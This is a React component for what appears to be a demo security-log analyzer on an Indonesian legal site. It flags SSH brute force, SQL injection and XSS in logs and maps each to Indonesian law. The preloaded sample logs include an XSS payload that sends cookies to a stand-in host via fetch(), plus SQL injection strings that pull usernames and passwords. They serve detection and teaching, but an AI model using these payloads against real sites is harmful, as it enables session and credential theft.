import { useState, useEffect, useRef } from "react";
import { Terminal, ShieldAlert, FileText, CheckCircle2, AlertOctagon, HelpCircle, RefreshCw, UploadCloud, Gavel } from "lucide-react";
import { SecurityLog } from "../types";

interface LogAnalyzerProps {
  playClick: () => void;
  soundEnabled: boolean;
}

export default function SecurityLogAnalyzer({ playClick, soundEnabled }: LogAnalyzerProps) {
  // Real-time log stream states
  const [liveStreamLogs, setLiveStreamLogs] = useState<SecurityLog[]>([]);
  const [isStreaming, setIsStreaming] = useState(true);
  
  // Log Evaluator states
  const [inputText, setInputText] = useState("");
  const [analyzedLogs, setAnalyzedLogs] = useState<SecurityLog[]>([]);
  const [systemHealth, setSystemHealth] = useState(100);
  const [criticalThreatsCount, setCriticalThreatsCount] = useState(0);
  const [complianceViolationsCount, setComplianceViolationsCount] = useState(0);
  const [selectedSample, setSelectedSample] = useState<string>("");

  const streamTimerRef = useRef<NodeJS.Timeout | null>(null);

  // Play audio sound helper
  const playBeep = (freq: number, type: OscillatorType = "sine", duration = 0.08) => {
    if (!soundEnabled) return;
    try {
      const audioCtx = new (window.AudioContext || (window as any).webkitAudioContext)();
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.type = type;
      osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
      gain.gain.setValueAtTime(0.04, audioCtx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + duration);
      osc.connect(gain);
      gain.connect(audioCtx.destination);
      osc.start();
      osc.stop(audioCtx.currentTime + duration);
    } catch (e) {
      // Ignored
    }
  };

  // Preloaded security logs samples
  const logSamples = {
    sshBruteForce: `2026-07-15T12:00:01.124Z 192.168.10.22 sshd[4012]: Failed password for root from 185.220.101.44 port 4322 ssh2
2026-07-15T12:00:02.502Z 192.168.10.22 sshd[4012]: Failed password for root from 185.220.101.44 port 4328 ssh2
2026-07-15T12:00:04.110Z 192.168.10.22 sshd[4012]: Failed password for root from 185.220.101.44 port 4334 ssh2
2026-07-15T12:00:05.990Z 192.168.10.22 sshd[4012]: Failed password for invalid_user admin from 185.220.101.44 port 4340 ssh2
2026-07-15T12:00:07.456Z 192.168.10.22 sshd[4012]: Accepted password for root from 185.220.101.44 port 4348 ssh2`,

    sqlInjection: `2026-07-15T12:05:10.512Z NGINX_ACCESS 182.253.14.90 "GET /api/legal/documents?id=3%20OR%25201%253D1 HTTP/1.1" 200 4520 "Mozilla/5.0"
2026-07-15T12:05:12.890Z NGINX_ACCESS 182.253.14.90 "GET /api/legal/documents?id=-1%20UNION%20SELECT%20username,%20password%20FROM%20users HTTP/1.1" 500 240 "Mozilla/5.0"`,

    xssAttack: `2026-07-15T12:10:44.221Z NGINX_ACCESS 202.152.38.10 "POST /api/contact/message HTTP/1.1" 400 125 "Payload: <script>fetch('http://malicious-server.xyz/steal?cookie=' + document.cookie)</script>"`,

    compliantLogs: `2026-07-15T12:15:00.100Z COMPLIANCE_MONITORING: Standard check for OSS RBA business permit credentials initiated - status: verified.
2026-07-15T12:15:05.420Z DB_LOCAL_PORTAL: Backup of clients database encrypted via AES-256 successfully - status: secure.
2026-07-15T12:15:10.992Z FIDUSIA_SERVICE: Printing secure registration certificate #FID-99120 for PT Bank Mandiri - status: success.`
  };

  // --- REAL-TIME LIVE LOG STREAM GENERATOR ---
  useEffect(() => {
    if (!isStreaming) return;

    const sourceIPs = ["114.125.10.82", "180.252.14.10", "192.168.1.100", "185.220.101.5", "103.152.110.2"];
    const services = ["sshd", "nginx_access", "db_local", "fidusia_portal", "oss_rba_checker"];
    const payloads = [
      "Failed password for invalid user admin on port 22",
      "GET /api/documents/pertanahan?id=1240 HTTP/1.1 - Status: 200",
      "GET /api/login?user=%27%20OR%20%271%27%3D%271 HTTP/1.1 - Status: 401",
      "Database backup serialized and securely encrypted via AES-256",
      "Accepted RSA public key for user falahi_admin from authorized IP",
      "WARNING: Anomalous database query on table: legal_klien_archives",
      "POST /api/contact/messages HTTP/1.1 - Payload: <script>alert(1)</script>"
    ];

    const generateLiveLog = () => {
      const randomIp = sourceIPs[Math.floor(Math.random() * sourceIPs.length)];
      const randomService = services[Math.floor(Math.random() * services.length)];
      const randomPayload = payloads[Math.floor(Math.random() * payloads.length)];
      
      let severity: "INFO" | "WARNING" | "CRITICAL" = "INFO";
      let threatDetected: string | null = null;
      let complianceViolation: string | null = null;
      let lawReferenced: string | null = null;

      // Classify log
      if (randomPayload.includes("Failed") || randomPayload.includes("WARNING")) {
        severity = "WARNING";
        if (randomPayload.includes("Failed")) {
          threatDetected = "Brute Force SSH Attempt";
          complianceViolation = "Upaya akses tidak sah ke aset server";
          lawReferenced = "UU ITE Pasal 30 (Akses Tanpa Hak)";
        } else {
          threatDetected = "Anomalous Database Query";
          complianceViolation = "Pelanggaran integritas database privat";
          lawReferenced = "UU PDP Pasal 35 (Pelanggaran Privasi)";
        }
      } else if (randomPayload.includes("OR 1=1") || randomPayload.includes("%27") || randomPayload.includes("<script>")) {
        severity = "CRITICAL";
        if (randomPayload.includes("script")) {
          threatDetected = "Cross-Site Scripting (XSS)";
          complianceViolation = "Upaya penyisipan skrip berbahaya";
          lawReferenced = "UU ITE Pasal 32 (Perusakan Data)";
        } else {
          threatDetected = "SQL Injection Intrusion";
          complianceViolation = "Upaya bypass sistem autentikasi database";
          lawReferenced = "UU ITE Pasal 30 / UU PDP (Kebocoran Data)";
        }
      }

      const newLog: SecurityLog = {
        id: Math.random().toString(),
        timestamp: new Date().toISOString(),
        sourceIP: randomIp,
        service: randomService,
        payload: randomPayload,
        severity,
        threatDetected,
        complianceViolation,
        lawReferenced,
        status: "unresolved"
      };

      if (severity === "CRITICAL") playBeep(261.6, "sawtooth", 0.15); // C4 beep
      else if (severity === "WARNING") playBeep(329.6, "triangle", 0.08); // E4 beep
      
      setLiveStreamLogs((prev) => [newLog, ...prev.slice(0, 49)]);
    };

    streamTimerRef.current = setInterval(generateLiveLog, 3000);

    return () => {
      if (streamTimerRef.current) clearInterval(streamTimerRef.current);
    };
  }, [isStreaming, soundEnabled]);

  // --- LOG PARSER & EVALUATION ENGINE ---
  const handleEvaluateLogs = (rawText: string) => {
    if (!rawText.trim()) return;

    const lines = rawText.split("\n");
    const parsed: SecurityLog[] = [];
    let score = 100;
    let criticalCount = 0;
    let violationsCount = 0;

    lines.forEach((line, idx) => {
      if (!line.trim()) return;

      let severity: "INFO" | "WARNING" | "CRITICAL" = "INFO";
      let threatDetected: string | null = null;
      let complianceViolation: string | null = null;
      let lawReferenced: string | null = null;
      let sourceIP = "0.0.0.0";
      let service = "unknown_daemon";

      // Simple parsing of source IP & Service
      const ipMatch = line.match(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/);
      if (ipMatch) sourceIP = ipMatch[0];

      if (line.toLowerCase().includes("sshd")) service = "sshd";
      else if (line.toLowerCase().includes("nginx")) service = "nginx_access";
      else if (line.toLowerCase().includes("db_local")) service = "db_local";
      else if (line.toLowerCase().includes("fidusia")) service = "fidusia_portal";
      else if (line.toLowerCase().includes("oss_rba")) service = "oss_rba";

      // 1. Detect SSH Brute Force
      if (line.toLowerCase().includes("failed password")) {
        severity = "WARNING";
        threatDetected = "SSH Login Failure";
        complianceViolation = "Upaya otorisasi tidak sah pada kredensial server.";
        lawReferenced = "UU ITE Pasal 30 ayat (1)";
        score -= 5;
      }
      
      if (line.toLowerCase().includes("accepted password") && sourceIP === "185.220.101.44") {
        // Brute force succeeded! Extremely Critical!
        severity = "CRITICAL";
        threatDetected = "SSH Session Hijacked (Brute Force Succeeded)";
        complianceViolation = "Sistem telah dijebol! Kredensial administratif dikompromikan.";
        lawReferenced = "UU ITE Pasal 30 ayat (3) & UU PDP Pasal 46";
        score -= 40;
        criticalCount++;
        violationsCount++;
      }

      // 2. Detect SQL Injection
      if (line.toLowerCase().includes("union select") || line.toLowerCase().includes("%3d1") || line.toLowerCase().includes("1%20or%201")) {
        severity = "CRITICAL";
        threatDetected = "SQL Injection Attempt";
        complianceViolation = "Suntikan instruksi query database untuk mencuri kredensial klien.";
        lawReferenced = "UU ITE Pasal 30 ayat (2) & UU PDP Pasal 35";
        score -= 20;
        criticalCount++;
        violationsCount++;
      }

      // 3. Detect XSS Attack
      if (line.toLowerCase().includes("<script>") || line.toLowerCase().includes("%3cscript")) {
        severity = "CRITICAL";
        threatDetected = "Cross-Site Scripting (XSS) Injection";
        complianceViolation = "Penyisipan muatan skrip javascript berbahaya pada form input publik.";
        lawReferenced = "UU ITE Pasal 32 ayat (1)";
        score -= 15;
        criticalCount++;
        violationsCount++;
      }

      // 4. Compliant Legal Log check
      if (line.toLowerCase().includes("secure") || line.toLowerCase().includes("encrypted") || line.toLowerCase().includes("verified")) {
        severity = "INFO";
      }

      parsed.push({
        id: `parsed-${idx}-${Date.now()}`,
        timestamp: new Date().toISOString(),
        sourceIP,
        service,
        payload: line,
        severity,
        threatDetected,
        complianceViolation,
        lawReferenced,
        status: "unresolved"
      });
    });

    setAnalyzedLogs(parsed);
    setCriticalThreatsCount(criticalCount);
    setComplianceViolationsCount(violationsCount);
    setSystemHealth(Math.max(10, score));
  };

  const handleSelectSample = (sampleKey: string) => {
    setSelectedSample(sampleKey);
    playClick();
    if (sampleKey === "sshBruteForce") {
      setInputText(logSamples.sshBruteForce);
      handleEvaluateLogs(logSamples.sshBruteForce);
    } else if (sampleKey === "sqlInjection") {
      setInputText(logSamples.sqlInjection);
      handleEvaluateLogs(logSamples.sqlInjection);
    } else if (sampleKey === "xssAttack") {
      setInputText(logSamples.xssAttack);
      handleEvaluateLogs(logSamples.xssAttack);
    } else if (sampleKey === "compliantLogs") {
      setInputText(logSamples.compliantLogs);
      handleEvaluateLogs(logSamples.compliantLogs);
    }
  };

  return (
    <section id="logs" className="relative py-24 bg-[#07070d] border-t border-gray-900 overflow-hidden">
      <div className="absolute inset-0 cyber-grid-magenta opacity-10 pointer-events-none" />

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
        
        {/* Section Header */}
        <div className="text-center max-w-3xl mx-auto mb-16">
          <div className="inline-flex items-center space-x-2 text-cyber-magenta mb-2">
            <ShieldAlert className="h-4 w-4 animate-bounce" />
            <span className="font-mono text-xs uppercase tracking-widest">SIEM LOG ANALYSIS CENTER</span>
          </div>
          <h2 className="font-cyber font-black text-2xl sm:text-4xl tracking-wider text-white uppercase">
            MODUL ANALISIS <span className="text-cyber-magenta">LOG KEAMANAN</span>
          </h2>
          <div className="h-[2px] w-24 bg-gradient-to-r from-cyber-magenta to-cyber-cyan mx-auto mt-4"></div>
          <p className="mt-4 text-gray-400 font-sans text-xs sm:text-sm max-w-2xl mx-auto leading-relaxed">
            Pusat monitoring ancaman terpadu yang memetakan anomali aktivitas siber ke dalam standar kepatuhan hukum Indonesia (UU ITE &amp; UU PDP) secara real-time.
          </p>
        </div>

        {/* SIEM Main grid */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
          
          {/* Left Column: Real-time Live Log Monitor Stream */}
          <div className="lg:col-span-5 bg-cyber-card/60 p-5 rounded-xl border border-gray-800 backdrop-blur-md space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="font-cyber font-bold text-xs text-white uppercase tracking-wider flex items-center">
                <Terminal className="h-4 w-4 text-cyber-cyan mr-2 animate-pulse" />
                <span>Monitoring Real-Time Stream</span>
              </h3>
              <button
                onClick={() => { playClick(); setIsStreaming(!isStreaming); }}
                className={`px-2 py-1 rounded text-[9px] font-mono border uppercase tracking-wider cursor-pointer ${
                  isStreaming
                    ? "border-cyber-green/40 bg-cyber-green/10 text-cyber-green"
                    : "border-gray-700 text-gray-400 hover:text-white"
                }`}
              >
                {isStreaming ? "Stream Active" : "Stream Paused"}
              </button>
            </div>
            
            {/* Streaming panel */}
            <div className="bg-[#07070d] rounded-lg border border-gray-850 p-4 h-[350px] overflow-y-auto font-mono text-[10px] space-y-3 scrollbar-thin text-left">
              {liveStreamLogs.length === 0 ? (
                <div className="text-gray-650 italic text-center pt-32">
                  Menunggu koneksi secure log stream...
                </div>
              ) : (
                liveStreamLogs.map((log) => {
                  let badgeColor = "bg-gray-900 text-gray-400 border-gray-800";
                  if (log.severity === "CRITICAL") badgeColor = "bg-red-950/40 text-red-400 border-red-900/30";
                  else if (log.severity === "WARNING") badgeColor = "bg-yellow-950/40 text-yellow-400 border-yellow-900/30";

                  return (
                    <div key={log.id} className="pb-2.5 border-b border-gray-900/50 space-y-1">
                      <div className="flex items-center justify-between">
                        <span className="text-gray-600 text-[8px]">{new Date(log.timestamp).toLocaleTimeString()}</span>
                        <div className="flex items-center space-x-1.5">
                          <span className="text-cyber-cyan font-semibold text-[8px]">{log.sourceIP}</span>
                          <span className={`px-1 rounded text-[7px] border font-bold uppercase tracking-widest ${badgeColor}`}>{log.severity}</span>
                        </div>
                      </div>
                      <div className="text-gray-300 break-all leading-relaxed text-[9px] bg-gray-950 p-1.5 rounded border border-gray-900">
                        {log.payload}
                      </div>
                      
                      {/* Legal matching alert */}
                      {log.threatDetected && (
                        <div className="text-cyber-magenta text-[8px] font-bold flex items-start space-x-1 mt-1">
                          <ShieldAlert className="h-3 w-3 mr-1 shrink-0 mt-0.5" />
                          <div>
                            <span>THREAT: {log.threatDetected} | VIOLATION: {log.lawReferenced}</span>
                          </div>
                        </div>
                      )}
                    </div>
                  );
                })
              )}
            </div>
          </div>

          {/* Right Column: Custom Log Evaluator and compliance matrix */}
          <div className="lg:col-span-7 space-y-6">
            
            <div className="bg-cyber-card/60 p-5 rounded-xl border border-gray-800 backdrop-blur-md space-y-4">
              <h3 className="font-cyber font-bold text-xs text-white uppercase tracking-wider flex items-center">
                <UploadCloud className="h-4 w-4 text-cyber-magenta mr-2" />
                <span>Unggah &amp; Analisis File Log Akses</span>
              </h3>
              <p className="text-gray-400 text-xs font-sans leading-relaxed text-left">
                Gunakan preloaded sample serangan siber di bawah untuk memproses dan mendeteksi anomali pada log server, atau tempel log server Nginx/SSH Anda sendiri untuk mengevaluasi status kepatuhan hukum sistem.
              </p>

              {/* Sample Selector chips */}
              <div className="flex flex-wrap gap-2 text-left">
                <button
                  onClick={() => handleSelectSample("sshBruteForce")}
                  className={`px-3 py-1.5 rounded text-[10px] font-mono border transition-all cursor-pointer ${
                    selectedSample === "sshBruteForce"
                      ? "border-cyber-magenta bg-cyber-magenta/15 text-cyber-magenta font-bold"
                      : "border-gray-850 text-gray-400 hover:border-gray-700"
                  }`}
                >
                  SSH Brute Force
                </button>
                <button
                  onClick={() => handleSelectSample("sqlInjection")}
                  className={`px-3 py-1.5 rounded text-[10px] font-mono border transition-all cursor-pointer ${
                    selectedSample === "sqlInjection"
                      ? "border-cyber-cyan bg-cyber-cyan/15 text-cyber-cyan font-bold"
                      : "border-gray-850 text-gray-400 hover:border-gray-700"
                  }`}
                >
                  SQL Injection
                </button>
                <button
                  onClick={() => handleSelectSample("xssAttack")}
                  className={`px-3 py-1.5 rounded text-[10px] font-mono border transition-all cursor-pointer ${
                    selectedSample === "xssAttack"
                      ? "border-cyber-yellow bg-cyber-yellow/15 text-cyber-yellow font-bold"
                      : "border-gray-850 text-gray-400 hover:border-gray-700"
                  }`}
                >
                  XSS Attack
                </button>
                <button
                  onClick={() => handleSelectSample("compliantLogs")}
                  className={`px-3 py-1.5 rounded text-[10px] font-mono border transition-all cursor-pointer ${
                    selectedSample === "compliantLogs"
                      ? "border-cyber-green bg-cyber-green/15 text-cyber-green font-bold"
                      : "border-gray-850 text-gray-400 hover:border-gray-700"
                  }`}
                >
                  Compliant Audit Logs
                </button>
              </div>

              {/* Text Input area */}
              <div className="space-y-3 pt-2 text-left">
                <textarea
                  value={inputText}
                  onChange={(e) => { setInputText(e.target.value); handleEvaluateLogs(e.target.value); }}
                  rows={4}
                  placeholder="Tempel file log (e.g. access.log atau auth.log) di sini untuk dianalisis oleh Mesin Kepatuhan..."
                  className="w-full bg-[#07070d] border border-gray-800 focus:border-cyber-magenta rounded p-3 text-xs font-mono text-white outline-none"
                />
              </div>

              {/* Security Metrics Dashboard readout */}
              {analyzedLogs.length > 0 && (
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4 pt-2">
                  {/* Health score */}
                  <div className="bg-[#07070d] p-4 rounded border border-gray-850 text-left">
                    <div className="text-[9px] font-mono text-gray-500 uppercase tracking-wider">Integrity Level</div>
                    <div className="mt-1 flex items-baseline space-x-2">
                      <span className={`font-cyber font-black text-2xl ${
                        systemHealth > 80 ? "text-cyber-green" : systemHealth > 50 ? "text-cyber-yellow" : "text-red-500"
                      }`}>{systemHealth}%</span>
                      <span className="text-[9px] font-mono text-gray-500">SYS_SECURE</span>
                    </div>
                  </div>

                  {/* Critical Threat Count */}
                  <div className="bg-[#07070d] p-4 rounded border border-gray-850 text-left">
                    <div className="text-[9px] font-mono text-gray-500 uppercase tracking-wider">Ancaman Kritis</div>
                    <div className="mt-1 flex items-baseline space-x-2">
                      <span className={`font-cyber font-black text-2xl ${
                        criticalThreatsCount > 0 ? "text-red-500" : "text-cyber-green"
                      }`}>{criticalThreatsCount}</span>
                      <span className="text-[9px] font-mono text-gray-500">INTRUSIONS</span>
                    </div>
                  </div>

                  {/* Compliance violation count */}
                  <div className="bg-[#07070d] p-4 rounded border border-gray-850 text-left">
                    <div className="text-[9px] font-mono text-gray-500 uppercase tracking-wider">Pelanggaran UU RI</div>
                    <div className="mt-1 flex items-baseline space-x-2">
                      <span className={`font-cyber font-black text-2xl ${
                        complianceViolationsCount > 0 ? "text-cyber-yellow" : "text-cyber-green"
                      }`}>{complianceViolationsCount}</span>
                      <span className="text-[9px] font-mono text-gray-500">REG_VIOLATIONS</span>
                    </div>
                  </div>
                </div>
              )}
            </div>

            {/* Detailed Compliance Audits */}
            {analyzedLogs.filter(log => log.threatDetected).length > 0 && (
              <div className="bg-cyber-card/60 p-5 rounded-xl border border-red-950/40 text-left space-y-4">
                <h4 className="font-cyber font-bold text-xs text-white uppercase tracking-widest flex items-center text-red-400">
                  <Gavel className="h-4 w-4 mr-2" />
                  <span>Daftar Temuan Pelanggaran Regulasi Hukum Indonesia</span>
                </h4>
                <div className="space-y-3 text-xs">
                  {analyzedLogs.filter(log => log.threatDetected).map((log, idx) => (
                    <div key={idx} className="p-3 bg-[#0a0a14] rounded border border-red-950/30 space-y-1">
                      <div className="flex items-center justify-between font-mono text-[10px]">
                        <span className="text-cyber-magenta font-bold">{log.threatDetected}</span>
                        <span className="text-red-400">{log.lawReferenced}</span>
                      </div>
                      <p className="text-gray-400 text-xs">
                        <strong className="text-white">Dampak Regulasi:</strong> {log.complianceViolation}
                      </p>
                      <p className="text-cyber-cyan text-xs">
                        <strong className="text-white">Rekomendasi Hukum &amp; IT Ops:</strong> Enkripsi database klien serta batasi IP subnet firewall sejalan dengan kewajiban PP PSTE No. 71/2019 Pasal 3.
                      </p>
                    </div>
                  ))}
                </div>
              </div>
            )}

          </div>

        </div>

      </div>
    </section>
  );
}
